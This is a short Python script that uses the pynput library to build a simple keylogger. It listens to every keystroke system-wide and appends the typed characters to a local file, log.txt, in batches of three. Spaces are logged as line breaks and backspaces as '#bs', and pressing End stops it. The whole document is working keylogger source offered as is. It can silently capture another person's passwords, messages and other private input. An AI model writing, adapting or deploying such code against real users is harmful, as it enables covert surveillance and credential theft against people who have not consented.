import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global count, keys
    keys.append(key)
    count += 1

    if count >= 3:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a+") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if 'Key.space' in k:
                file.write('\n')
            if 'Key.backspace' in k:
                file.write('#bs')
            elif k.find("Key") == -1:
                file.write(str(k))

def on_release(key):
    if key == Key.end:
        return False

with Listener (on_press=on_press, on_release=on_release) as listener:
    listener.join()
